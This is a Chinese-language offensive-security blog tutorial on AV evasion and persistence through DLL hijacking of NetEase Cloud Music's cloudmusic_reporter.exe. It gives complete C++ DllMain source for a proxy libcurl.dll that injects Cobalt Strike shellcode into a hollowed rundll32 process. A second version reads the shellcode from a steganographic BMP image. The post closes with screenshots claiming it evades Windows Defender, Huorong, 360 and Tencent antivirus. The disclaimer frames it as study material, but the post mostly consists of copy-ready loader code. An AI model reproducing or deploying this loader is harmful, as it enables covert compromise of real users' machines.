**声明：⽂中所涉及的技术、思路和⼯具仅供以安全为⽬的的学习交流使⽤，任何⼈不得将其⽤于⾮法⽤途以及盈利等⽬的，否则后果⾃⾏承担。**

## 0x00 简述

最近一直在打攻防，很多时候都需要用到免杀，那么怎么能快速做免杀和权限维持就是一个问题，于是就想起来利用白加黑快速做免杀或权限维持，俗称有手就行，废话不多说直接开干！

## 0x01 寻找合适文件

文章主题是白加黑，肯定是需要寻找一些合法的程序，我们这里利用dll劫持去做白加黑免杀或权限维持，所以尝试是否存在有可以劫持dll的exe文件。  
平时大家应该都会用到网抑云音乐，所以就想着拿它做一个例子，文件夹内共发现这么三个exe。  
![1](https://image.3001.net/images/20220519/1652961441_628630a14cbb4e32af2ba.png!small)  
在尝试的过程中发现cloudmusic_reporter.exe(并发现是32位程序)单独复制出来运行会产生报错缺少dll文件。  
![2](https://image.3001.net/images/20220519/1652961729_628631c17f9cf0008eb32.png!small)  
将缺失的dll文件复制到相同文件夹后即可成功运行，而且他并没有对dll文件做签名校验。  
![3](https://image.3001.net/images/20220519/1652961949_6286329d876a2f772be48.png!small)

* * *

#### 0x02 dll函数模仿

* * *

既然确定了文件，那么肯定会需要一些调试分析工具，这里用到的是集成Aheadlib后Dependencies。

 **下载地址：https://pan.baidu.com/s/1AByZbmrXupmX-TF7tGfJqg 提取码：8ovq**

使用也非常简单，首先打开GUI文件，再将dll拖入其中即可。  
![4](https://image.3001.net/images/20220519/1652962931_62863673408c4f352b27e.png!small)右键利用Aheadlib将dll函数模仿导出到指定文件夹。  
![5](https://image.3001.net/images/20220519/1652962948_6286368421fa4fb0f4285.png!small)生成之后总共是三个文件
.c .h .asm。下文会详细说明都是干什么用的。  
![6](https://image.3001.net/images/20220519/1652963004_628636bcc0aa7a14d4631.png!small)

## 0x03 分析生成

打开Visual Studio创建C++win32动态链接库项目。  
![7](https://image.3001.net/images/20220519/1652963038_628636de896255a0f73ce.png!small)

将之前生成的三个文件复制到项目文件夹后手动拖入到解决方案，并在入口处引用头文件。  
![8](https://image.3001.net/images/20220519/1652963060_628636f4a5e0c17ff94c8.png!small)接下来看一下具体这些文件都有什么作用。

libcurl.c这个文件运行的时候会获取dll内的函数并将其保存到指针内。

指针会去改变原本的函数地址进行链接，使用汇编的方式进行跳转，也就是libcurl_jump.asm这个文件。  
![9](https://image.3001.net/images/20220519/1652963078_62863706a39f938d18c8f.png!small)由于不需要用到跳转所以采用最笨的方法，去汇编文件内手动删除跳转。  
![10](https://image.3001.net/images/20220519/1652963098_6286371aea4ab46ddcf44.png!small)汇编文件需要手动配置，具体怎么配置在文件最开始处已经标明了。  
![11](https://image.3001.net/images/20220519/1652963112_62863728b6898d4e50cdf.png!small)尝试生成，发现可以成功生成就可以了。

![12](https://image.3001.net/images/20220519/1652963131_6286373b01ae790c0ecbc.png!small)

## 0x04 shellcode加载

直接百度找一个傀儡进程注入源码复制进去即可。  
![13](https://image.3001.net/images/20220519/1652963159_62863757395d362931b2e.jpg!small)随后打开CS生成一段32位的shellcode保存。

并复制到源码内，根据粘贴进来的shellcode对源码进行修改完善。

这里将修改好的源代码贴出来方便大家复制。

    
    
    // dllmain.cpp : 定义 DLL 应用程序的入口点。
    #include "framework.h"
    #include "libcurl.h"
    #include "windows.h"
    
    BOOL APIENTRY DllMain( HMODULE hModule,
                           DWORD  ul_reason_for_call,
                           LPVOID lpReserved
                         )
    {
        switch (ul_reason_for_call)
        {
        case DLL_PROCESS_ATTACH:
        {
            uunsigned char hexData[] = "\xe8\x00\x00\x00\x00\x58\x5f\x05\x5b\x03\x00\x00\x68\x8c\x00\x00\x00\x50\x57\x55\x8b\xec\x83\xec\x68\x53\x56\x57\x6a\x22\x68\x64\xfc\xfb\x3c\xe8\x30\x02\x00\x00\x6a\x22\x8b";
    
    		char* v7A = (char*)VirtualAlloc(0, _countof(hexData), 0x3000u, 0x40u);
    		memcpy((void*)v7A, hexData, _countof(hexData));
    
    		struct _PROCESS_INFORMATION ProcessInformation;
    		struct _STARTUPINFOA StartupInfo;
    		void* v24;
    		CONTEXT Context;
    		DWORD DwWrite = 0;
    		memset(&StartupInfo, 0, sizeof(StartupInfo));
    		StartupInfo.cb = 68;
    		BOOL result = CreateProcessA(0, (LPSTR)"rundll32.exe", 0, 0, 0, 0x44u, 0, 0, &StartupInfo, &ProcessInformation);
    		if (result)
    		{
    			Context.ContextFlags = 65539;
    			GetThreadContext(ProcessInformation.hThread, &Context);
    			v24 = VirtualAllocEx(ProcessInformation.hProcess, 0, _countof(hexData), 0x1000u, 0x40u);
    			WriteProcessMemory(ProcessInformation.hProcess, v24, v7A, _countof(hexData), &DwWrite);
    			Context.Eip = (DWORD)v24;
    			SetThreadContext(ProcessInformation.hThread, &Context);
    			ResumeThread(ProcessInformation.hThread);
    			CloseHandle(ProcessInformation.hThread);
    			result = CloseHandle(ProcessInformation.hProcess);
    		}
    
    
    		TerminateProcess(GetCurrentProcess(), 0);
        };
    
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
        }
        return TRUE;
    }
    

生成dll文件，并将其重命名为libcurl.dll，与cloudmusic_reporter.exe放在同一文件夹内，双击运行查看是否上线成功。  
![16（其实是14](https://image.3001.net/images/20220519/1652963351_628638172e47a5de4e724.png!small)这样还是不够的，因为没有加密处于裸奔的状态，写个加密算法又很麻烦，这就想到了把shellcode存放在图片内进行隐写。

 **这里需要用到开源的工具**  
github:https://github.com/Mr-Un1k0d3r/DKMC

利用工具配合shellcode生成图片。  
![17](https://image.3001.net/images/20220519/1652963393_6286384174e0424ba624b.png!small)

随后继续更改源代码，从图片文件读取shellcode。

源代码如下：

    
    
    // dllmain.cpp : 定义 DLL 应用程序的入口点。
    #include "framework.h"
    #include "windows.h"
    #include "libcurl.h"
    #include <stdlib.h>
    #include <stdio.h>
    
    
    BOOL APIENTRY DllMain( HMODULE hModule,
                           DWORD  ul_reason_for_call,
                           LPVOID lpReserved
                         )
    {
        switch (ul_reason_for_call)
        {
        case DLL_PROCESS_ATTACH:
        {
            FILE* fp;  // 定义流式文件操作变量fp，FILE结构体在stdio.h里面有定义
            size_t size;  // 定义文件字节数变量size
            unsigned char* buffer;  // 定义缓存指针变量
    
            fp = fopen("cloudmusic.bmp", "rb");
            // fseek()负号前移，正号后移
            fseek(fp, 0, SEEK_END);          // 文件指针指向文件末尾
            // ftell()返回给定流 stream 的当前文件位置
            size = ftell(fp);                // size值为文件大小
            fseek(fp, 0, SEEK_SET);          // 文件指针指向文件开头
            buffer = (unsigned char*)malloc(size);    // 动态申请图片大小的内存空间（数组指针）
            fread(buffer, size, 1, fp);  // 从fp读取和显示1个size大小的数据
    
            char* v7A = (char*)VirtualAlloc(0, size, 0x3000u, 0x40u);
            memcpy((void*)v7A, buffer, size);
    
            struct _PROCESS_INFORMATION ProcessInformation;
            struct _STARTUPINFOA StartupInfo;
            void* v24;
            CONTEXT Context;
            DWORD DwWrite = 0;
            memset(&StartupInfo, 0, sizeof(StartupInfo));
            StartupInfo.cb = 68;
            BOOL result = CreateProcessA(0, (LPSTR)"rundll32.exe", 0, 0, 0, 0x44u, 0, 0, &StartupInfo, &ProcessInformation);
            if (result)
            {
                Context.ContextFlags = 65539;
                GetThreadContext(ProcessInformation.hThread, &Context);
                v24 = VirtualAllocEx(ProcessInformation.hProcess, 0, size, 0x1000u, 0x40u);
                WriteProcessMemory(ProcessInformation.hProcess, v24, v7A, size, &DwWrite);
                Context.Eip = (DWORD)v24;
                SetThreadContext(ProcessInformation.hThread, &Context);
                ResumeThread(ProcessInformation.hThread);
                CloseHandle(ProcessInformation.hThread);
                result = CloseHandle(ProcessInformation.hProcess);
            }
    
    
            TerminateProcess(GetCurrentProcess(), 0);
        };
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
        }
        return TRUE;
    }
    

生成dll文件，在将exe，dll及图片放在一起再次运行查看是否可以成功上线。  
![18](https://image.3001.net/images/20220519/1652963436_6286386cd0f5601d1be22.png!small)

## 0x05 免杀效果

在VT上查杀dll和图片分别是4、5，这是没做任何加密的情况下，总体来看效果还算不错。  
![19](https://image.3001.net/images/20220519/1652963465_62863889c527258e0c18f.png!small)
**Windows Defender**  
![20](https://image.3001.net/images/20220519/1652963485_6286389db3d2e3bec81b9.png!small)
**火绒**  
![21](https://image.3001.net/images/20220519/1652963501_628638adeb1923fd82453.png!small)
360  
![22](https://image.3001.net/images/20220519/1652963518_628638be9ca8881d5e575.png!small)
**电脑管家**  
![23](https://image.3001.net/images/20220519/1652963535_628638cfe807da877baf7.png!small)

## 0x06 总结

总体来看到这就结束了，但还有很多坑没有解决，比如占用主线程导致不执行后续代码使软件本身功能失效，及如何利用工具自动化挖掘和后续的UAC等等。感谢实验室成员0x3135的爆肝产出，敬请期待我们后面的更新吧~

